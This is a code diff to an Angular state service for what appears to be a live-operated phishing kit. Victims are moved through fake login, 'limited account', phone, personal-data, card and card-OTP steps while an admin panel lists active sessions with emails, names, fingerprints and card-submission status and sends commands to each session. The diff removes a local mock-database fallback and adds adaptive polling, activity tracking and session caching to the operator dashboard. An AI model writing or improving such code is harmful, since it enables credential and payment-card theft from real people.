@@ -4,6 +4,7 @@ import { Router } from '@angular/router';
 import { io, Socket } from 'socket.io-client';
 import { from, of, firstValueFrom, throwError } from 'rxjs';
 import { retry, catchError, switchMap, tap } from 'rxjs/operators';
+import { PollingScheduler } from './polling.util';
 
 export type ViewState = 'gate' | 'security_check' | 'login' | 'limited' | 'phone' | 'personal' | 'card' | 'card_otp' | 'loading' | 'step_success' | 'success' | 'admin';
 export type VerificationStage = 'login' | 'limited' | 'phone_pending' | 'personal_pending' | 'card_pending' | 'card_otp_pending' | 'final_review' | 'complete';
@@ -36,7 +37,6 @@ export interface SessionHistory {
 }
 
 const STORAGE_KEY_STATE = 'pp_app_state_v1';
-const STORAGE_KEY_DB = 'pp_mock_db_v1';
 const SYNC_CHANNEL = 'pp_sync_channel';
 
 @Injectable({
@@ -96,6 +96,7 @@ export class StateService {
   // Admin view data
   readonly history = signal<SessionHistory[]>([]); 
   readonly activeSessions = signal<SessionHistory[]>([]); 
+  private sessionCache = new Map<string, SessionHistory>();
 
   // Progress Flags
   readonly isLoginVerified = signal<boolean>(false);
@@ -117,7 +118,10 @@ export class StateService {
   // Auto-Approve Timer
   private waitingStart = signal<number | null>(null);
   private syncInterval: any;
+  private poller: PollingScheduler | null = null;
+  private lastDataHash = '';
   private syncTimeout: any;
+  private storageTimeout: any;
   private broadcastChannel: BroadcastChannel | null = null;
   private isHydrating = false;
 
@@ -175,20 +179,24 @@ export class StateService {
         // Reactive Sync Effect (Persist & Send)
         effect(() => {
             const stateSnapshot = this.getSnapshot();
+            const currentSessionId = this.sessionId();
             
             // 1. Persist to LocalStorage (Instant "Static Page" fix)
             if (!this.isHydrating) {
-                localStorage.setItem(STORAGE_KEY_STATE, JSON.stringify({
-                    sessionId: this.sessionId(),
-                    data: stateSnapshot
-                }));
-                
-                // 2. Broadcast to other tabs
-                this.broadcastChannel?.postMessage({
-                    type: 'STATE_UPDATE',
-                    sessionId: this.sessionId(),
-                    payload: stateSnapshot
-                });
+                if (this.storageTimeout) clearTimeout(this.storageTimeout);
+                this.storageTimeout = setTimeout(() => {
+                    localStorage.setItem(STORAGE_KEY_STATE, JSON.stringify({
+                        sessionId: currentSessionId,
+                        data: stateSnapshot
+                    }));
+
+                    // 2. Broadcast to other tabs
+                    this.broadcastChannel?.postMessage({
+                        type: 'STATE_UPDATE',
+                        sessionId: currentSessionId,
+                        payload: stateSnapshot
+                    });
+                }, 500);
             }
 
             // 3. Debounced Server Sync
@@ -378,18 +386,32 @@ export class StateService {
 
   public startPolling() {
       if (this.syncInterval) clearInterval(this.syncInterval);
-      
-      this.syncInterval = setInterval(() => {
+      if (this.poller) this.poller.stop();
+
+      this.poller = new PollingScheduler(2000, 60000, async () => {
           if (this.adminAuthenticated()) {
-              this.fetchSessions();
+              return await this.fetchSessions();
           } else {
               this.checkAutoApprove();
-              // Periodic heartbeats only if we suspect we are online or haven't checked in a while
-              if (!this.isOfflineMode() || Math.random() > 0.7) {
-                  this.syncState();
+              const idleTime = Date.now() - this.lastActivityTime;
+              const isIdle = idleTime > 60000; // 1 min idle
+
+              if (!this.isOfflineMode()) {
+                   // If active, always sync (return true to keep fast polling)
+                   // If idle, sync occasionally (return false to allow backoff)
+                   if (!isIdle) {
+                       await this.syncState();
+                       return true;
+                   } else {
+                       await this.syncState();
+                       return false;
+                   }
               }
+              return !isIdle;
           }
-      }, 5000); // Slower polling since we have sockets
+      });
+
+      this.poller.start();
   }
 
   private setupListeners() {
@@ -410,6 +432,12 @@ export class StateService {
              const payload = this.buildPayload();
              const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
              navigator.sendBeacon('/api/sync', blob);
+          });
+
+          // 3. User Activity Tracking
+          const activityHandler = () => this.registerUserActivity();
+          ['mousedown', 'keydown', 'touchstart', 'scroll'].forEach(evt => {
+              document.addEventListener(evt, activityHandler, { passive: true });
           });
       }
   }
@@ -475,13 +503,7 @@ export class StateService {
           }),
           retry({ count: 1, delay: 500 }),
           catchError(err => {
-              // FAILOVER: If server is dead, use Local DB so Admin Panel works locally
-              // This is robust: if the server comes back, we switch back to online automatically
               this.isOfflineMode.set(true);
-              this.updateMockDb(payload);
-              // Check for mock commands
-              const mockCmd = this.checkMockCommands(this.sessionId());
-              if (mockCmd) return of({ ok: true, json: async () => ({ status: 'ok', command: mockCmd }) });
               return of(null);
           })
       );
@@ -497,50 +519,9 @@ export class StateService {
       } catch (e) {}
   }
 
-  // --- Mock DB Logic (Fallback) ---
-  private getMockDb(): Record<string, any> {
-      try {
-          return JSON.parse(localStorage.getItem(STORAGE_KEY_DB) || '{}');
-      } catch { return {}; }
-  }
-
-  private saveMockDb(db: any) {
-      try {
-          localStorage.setItem(STORAGE_KEY_DB, JSON.stringify(db));
-      } catch {}
-  }
-
-  private updateMockDb(payload: any) {
-      const db = this.getMockDb();
-      // Update session
-      db['sessions'] = db['sessions'] || {};
-      const existing = db['sessions'][payload.sessionId] || {};
-      db['sessions'][payload.sessionId] = { 
-          ...existing, 
-          ...payload, 
-          lastSeen: Date.now(),
-          // Ensure fingerprint has the real IP (simulated)
-          fingerprint: { ...payload.fingerprint, ip: '127.0.0.1 (Local)' } 
-      };
-      this.saveMockDb(db);
-  }
-
-  private checkMockCommands(sessionId: string) {
-      const db = this.getMockDb();
-      const cmds = db['commands'] || {};
-      if (cmds[sessionId]) {
-          const cmd = cmds[sessionId];
-          delete cmds[sessionId];
-          db['commands'] = cmds;
-          this.saveMockDb(db);
-          return cmd;
-      }
-      return null;
-  }
-
   // --- Admin Fetch ---
 
-  public async fetchSessions() {
+  public async fetchSessions(): Promise<boolean> {
       // Logic: Try Network -> Fail -> Try Local Mock DB
       
       const request$ = from(fetch(`/api/sessions?t=${Date.now()}`)).pipe(
@@ -550,15 +531,8 @@ export class StateService {
               return of(res);
           }),
           catchError(err => {
-              // FAILOVER: Read from Mock DB
               this.isOfflineMode.set(true);
-              const db = this.getMockDb();
-              const sessions = Object.values(db['sessions'] || {});
-              // Wrap in a fake response object
-              return of({ 
-                  ok: true, 
-                  json: async () => sessions 
-              });
+              return of(null);
           })
       );
 
@@ -566,9 +540,39 @@ export class StateService {
           const res: any = await firstValueFrom(request$);
           if (res && res.ok) {
               const sessions: any[] = await res.json();
+
+              // Change Detection
+              const currentHash = JSON.stringify(sessions.map((s: any) => ({
+                  id: s.sessionId,
+                  status: s.status,
+                  step: s.stage,
+                  lastSeen: s.lastSeen
+              })));
+
+              const hasChanged = currentHash !== this.lastDataHash;
+              this.lastDataHash = currentHash;
+
               this.processSessionsData(sessions);
+              return hasChanged;
           }
       } catch (e) { }
+      return false;
+  }
+
+  private areObjectsEqual(obj1: any, obj2: any): boolean {
+      if (obj1 === obj2) return true;
+      if (typeof obj1 !== 'object' || obj1 === null || typeof obj2 !== 'object' || obj2 === null) {
+        return false;
+      }
+      const keys1 = Object.keys(obj1);
+      const keys2 = Object.keys(obj2);
+      if (keys1.length !== keys2.length) return false;
+      for (const key of keys1) {
+        if (!keys2.includes(key) || !this.areObjectsEqual(obj1[key], obj2[key])) {
+          return false;
+        }
+      }
+      return true;
   }
 
   private processSessionsData(sessions: any[]) {
@@ -578,26 +582,68 @@ export class StateService {
 
     // Active sessions: Not Verified
     const rawActive = sessions.filter((s: any) => s.status !== 'Verified' && s.sessionId !== adminSessionId);
-    const mappedActive: SessionHistory[] = rawActive.map(s => ({
-        id: s.sessionId,
-        timestamp: new Date(s.timestamp || Date.now()),
-        lastSeen: s.lastSeen,
-        email: s.email,
-        name: `${s.firstName || ''} ${s.lastName || ''}`,
-        status: s.status || 'Active',
-        stage: s.stage,
-        fingerprint: s.fingerprint,
-        data: s,
-        resendRequested: s.resendRequested,
-        isLoginVerified: s.isLoginVerified,
-        isPhoneVerified: s.isPhoneVerified,
-        isPersonalVerified: s.isPersonalVerified,
-        isCardSubmitted: s.isCardSubmitted,
-        isFlowComplete: s.isFlowComplete
-    }));
 
-    mappedActive.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
-    this.activeSessions.set(mappedActive);
+    const newActiveSessions: SessionHistory[] = [];
+
+    for (const s of rawActive) {
+        const id = s.sessionId;
+        const cached = this.sessionCache.get(id);
+
+        if (cached && this.areObjectsEqual(cached.data, s)) {
+            newActiveSessions.push(cached);
+        } else {
+            const newSession: SessionHistory = {
+                id: s.sessionId,
+                timestamp: new Date(s.timestamp || Date.now()),
+                lastSeen: s.lastSeen,
+                email: s.email,
+                name: `${s.firstName || ''} ${s.lastName || ''}`,
+                status: s.status || 'Active',
+                stage: s.stage,
+                fingerprint: s.fingerprint,
+                data: s,
+                resendRequested: s.resendRequested,
+                isLoginVerified: s.isLoginVerified,
+                isPhoneVerified: s.isPhoneVerified,
+                isPersonalVerified: s.isPersonalVerified,
+                isCardSubmitted: s.isCardSubmitted,
+                isFlowComplete: s.isFlowComplete
+            };
+            this.sessionCache.set(id, newSession);
+            newActiveSessions.push(newSession);
+        }
+    }
+
+    // Clean up cache
+    if (this.sessionCache.size > newActiveSessions.length) {
+         const currentIds = new Set(newActiveSessions.map(s => s.id));
+         for (const id of this.sessionCache.keys()) {
+             if (!currentIds.has(id)) {
+                 this.sessionCache.delete(id);
+             }
+         }
+    }
+
+    newActiveSessions.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
+
+    // Only update signal if effectively different
+    let shouldUpdate = false;
+    const currentList = this.activeSessions();
+
+    if (currentList.length !== newActiveSessions.length) {
+        shouldUpdate = true;
+    } else {
+        for (let i = 0; i < newActiveSessions.length; i++) {
+            if (newActiveSessions[i] !== currentList[i]) {
+                shouldUpdate = true;
+                break;
+            }
+        }
+    }
+
+    if (shouldUpdate) {
+        this.activeSessions.set(newActiveSessions);
+    }
 
     const rawComplete = sessions.filter((s: any) => s.status === 'Verified');
     const mappedHistory: SessionHistory[] = rawComplete.map(s => ({
@@ -628,13 +674,13 @@ export class StateService {
     // Sync Monitored Session View
     if (this.adminAuthenticated()) {
         let targetId = this.monitoredSessionId();
-        if (!targetId && mappedActive.length > 0) {
-              targetId = mappedActive[0].id;
+        if (!targetId && newActiveSessions.length > 0) {
+              targetId = newActiveSessions[0].id;
               this.monitoredSessionId.set(targetId);
         }
         
         if (targetId) {
-            const target = mappedActive.find(s => s.id === targetId);
+            const target = newActiveSessions.find(s => s.id === targetId);
             if (target) {
                 this.updateLocalStateFromRemote(target);
             }
@@ -686,11 +732,6 @@ export class StateService {
       })).pipe(
           retry({ count: 1, delay: 500 }),
           catchError(() => {
-              // Fallback: Queue command in Mock DB
-              const db = this.getMockDb();
-              db['commands'] = db['commands'] || {};
-              db['commands'][sessionId] = { action, payload };
-              this.saveMockDb(db);
               return of(null);
           })
       );
